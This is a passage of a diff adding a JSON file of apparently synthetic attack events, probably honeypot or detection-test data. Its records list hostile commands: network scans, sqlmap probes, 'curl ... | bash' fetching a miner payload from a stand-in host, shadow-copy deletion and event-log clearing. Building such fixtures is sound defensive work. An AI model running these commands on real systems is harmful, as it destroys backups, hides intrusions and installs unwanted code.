+    "source_ip": "203.0.113.247"
+  },
+  {
+    "event_id": "evt-0135",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:28:54.751561+00:00",
+    "source_ip": "203.0.113.7"
+  },
+  {
+    "event_id": "evt-0136",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:28:57.751561+00:00",
+    "source_ip": "203.0.113.34"
+  },
+  {
+    "event_id": "evt-0137",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:29:00.751561+00:00",
+    "source_ip": "203.0.113.173"
+  },
+  {
+    "event_id": "evt-0138",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:29:03.751561+00:00",
+    "source_ip": "203.0.113.149"
+  },
+  {
+    "event_id": "evt-0139",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:29:06.751561+00:00",
+    "source_ip": "203.0.113.221"
+  },
+  {
+    "event_id": "evt-0140",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:29:09.751561+00:00",
+    "source_ip": "203.0.113.132"
+  },
+  {
+    "event_id": "evt-0141",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:29:12.751561+00:00",
+    "source_ip": "203.0.113.197"
+  },
+  {
+    "event_id": "evt-0142",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:29:15.751561+00:00",
+    "source_ip": "203.0.113.30"
+  },
+  {
+    "event_id": "evt-0143",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:29:18.751561+00:00",
+    "source_ip": "203.0.113.102"
+  },
+  {
+    "event_id": "evt-0144",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:29:21.751561+00:00",
+    "source_ip": "203.0.113.25"
+  },
+  {
+    "event_id": "evt-0145",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:29:24.751561+00:00",
+    "source_ip": "203.0.113.214"
+  },
+  {
+    "event_id": "evt-0146",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:29:27.751561+00:00",
+    "source_ip": "203.0.113.154"
+  },
+  {
+    "event_id": "evt-0147",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:29:30.751561+00:00",
+    "source_ip": "203.0.113.212"
+  },
+  {
+    "event_id": "evt-0148",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:29:33.751561+00:00",
+    "source_ip": "203.0.113.218"
+  },
+  {
+    "event_id": "evt-0149",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:29:36.751561+00:00",
+    "source_ip": "203.0.113.159"
+  },
+  {
+    "event_id": "evt-0150",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:29:39.751561+00:00",
+    "source_ip": "203.0.113.236"
+  },
+  {
+    "event_id": "evt-0151",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:29:42.751561+00:00",
+    "source_ip": "203.0.113.166"
+  },
+  {
+    "event_id": "evt-0152",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:29:45.751561+00:00",
+    "source_ip": "203.0.113.118"
+  },
+  {
+    "event_id": "evt-0153",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:29:48.751561+00:00",
+    "source_ip": "203.0.113.191"
+  },
+  {
+    "event_id": "evt-0154",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:29:51.751561+00:00",
+    "source_ip": "203.0.113.186"
+  },
+  {
+    "event_id": "evt-0155",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:29:54.751561+00:00",
+    "source_ip": "203.0.113.108"
+  },
+  {
+    "event_id": "evt-0156",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:29:57.751561+00:00",
+    "source_ip": "203.0.113.156"
+  },
+  {
+    "event_id": "evt-0157",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:30:00.751561+00:00",
+    "source_ip": "203.0.113.248"
+  },
+  {
+    "event_id": "evt-0158",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:30:03.751561+00:00",
+    "source_ip": "203.0.113.50"
+  },
+  {
+    "event_id": "evt-0159",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:30:06.751561+00:00",
+    "source_ip": "203.0.113.204"
+  },
+  {
+    "event_id": "evt-0160",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:30:09.751561+00:00",
+    "source_ip": "203.0.113.154"
+  },
+  {
+    "event_id": "evt-0161",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:30:12.751561+00:00",
+    "source_ip": "203.0.113.178"
+  },
+  {
+    "event_id": "evt-0162",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:30:15.751561+00:00",
+    "source_ip": "203.0.113.78"
+  },
+  {
+    "event_id": "evt-0163",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:30:18.751561+00:00",
+    "source_ip": "203.0.113.148"
+  },
+  {
+    "event_id": "evt-0164",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:30:21.751561+00:00",
+    "source_ip": "203.0.113.125"
+  },
+  {
+    "event_id": "evt-0165",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:30:24.751561+00:00",
+    "source_ip": "203.0.113.61"
+  },
+  {
+    "event_id": "evt-0166",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:30:27.751561+00:00",
+    "source_ip": "203.0.113.198"
+  },
+  {
+    "event_id": "evt-0167",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:30:30.751561+00:00",
+    "source_ip": "203.0.113.106"
+  },
+  {
+    "event_id": "evt-0168",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:30:33.751561+00:00",
+    "source_ip": "203.0.113.174"
+  },
+  {
+    "event_id": "evt-0169",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:30:36.751561+00:00",
+    "source_ip": "203.0.113.42"
+  },
+  {
+    "event_id": "evt-0170",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:30:39.751561+00:00",
+    "source_ip": "203.0.113.38"
+  },
+  {
+    "event_id": "evt-0171",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:30:42.751561+00:00",
+    "source_ip": "203.0.113.240"
+  },
+  {
+    "event_id": "evt-0172",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:30:45.751561+00:00",
+    "source_ip": "203.0.113.208"
+  },
+  {
+    "event_id": "evt-0173",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:30:48.751561+00:00",
+    "source_ip": "203.0.113.89"
+  },
+  {
+    "event_id": "evt-0174",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:30:51.751561+00:00",
+    "source_ip": "203.0.113.250"
+  },
+  {
+    "event_id": "evt-0175",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:30:54.751561+00:00",
+    "source_ip": "203.0.113.57"
+  },
+  {
+    "event_id": "evt-0176",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:30:57.751561+00:00",
+    "source_ip": "203.0.113.125"
+  },
+  {
+    "event_id": "evt-0177",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:31:00.751561+00:00",
+    "source_ip": "203.0.113.170"
+  },
+  {
+    "event_id": "evt-0178",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:31:03.751561+00:00",
+    "source_ip": "203.0.113.1"
+  },
+  {
+    "event_id": "evt-0179",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:31:06.751561+00:00",
+    "source_ip": "203.0.113.75"
+  },
+  {
+    "event_id": "evt-0180",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:31:09.751561+00:00",
+    "source_ip": "203.0.113.113"
+  },
+  {
+    "event_id": "evt-0181",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:31:12.751561+00:00",
+    "source_ip": "203.0.113.48"
+  },
+  {
+    "event_id": "evt-0182",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:31:15.751561+00:00",
+    "source_ip": "203.0.113.216"
+  },
+  {
+    "event_id": "evt-0183",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:31:18.751561+00:00",
+    "source_ip": "203.0.113.119"
+  },
+  {
+    "event_id": "evt-0184",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:31:21.751561+00:00",
+    "source_ip": "203.0.113.26"
+  },
+  {
+    "event_id": "evt-0185",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:31:24.751561+00:00",
+    "source_ip": "203.0.113.173"
+  },
+  {
+    "event_id": "evt-0186",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:31:27.751561+00:00",
+    "source_ip": "203.0.113.160"
+  },
+  {
+    "event_id": "evt-0187",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:31:30.751561+00:00",
+    "source_ip": "203.0.113.177"
+  },
+  {
+    "event_id": "evt-0188",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:31:33.751561+00:00",
+    "source_ip": "203.0.113.134"
+  },
+  {
+    "event_id": "evt-0189",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:31:36.751561+00:00",
+    "source_ip": "203.0.113.87"
+  },
+  {
+    "event_id": "evt-0190",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:31:39.751561+00:00",
+    "source_ip": "203.0.113.139"
+  },
+  {
+    "event_id": "evt-0191",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:31:42.751561+00:00",
+    "source_ip": "203.0.113.51"
+  },
+  {
+    "event_id": "evt-0192",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:31:45.751561+00:00",
+    "source_ip": "203.0.113.1"
+  },
+  {
+    "event_id": "evt-0193",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:31:48.751561+00:00",
+    "source_ip": "203.0.113.148"
+  },
+  {
+    "event_id": "evt-0194",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:31:51.751561+00:00",
+    "source_ip": "203.0.113.196"
+  },
+  {
+    "event_id": "evt-0195",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:31:54.751561+00:00",
+    "source_ip": "203.0.113.174"
+  },
+  {
+    "event_id": "evt-0196",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:31:57.751561+00:00",
+    "source_ip": "203.0.113.135"
+  },
+  {
+    "event_id": "evt-0197",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:32:00.751561+00:00",
+    "source_ip": "203.0.113.173"
+  },
+  {
+    "event_id": "evt-0198",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:32:03.751561+00:00",
+    "source_ip": "203.0.113.120"
+  },
+  {
+    "event_id": "evt-0199",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:32:06.751561+00:00",
+    "source_ip": "203.0.113.51"
+  }
+]
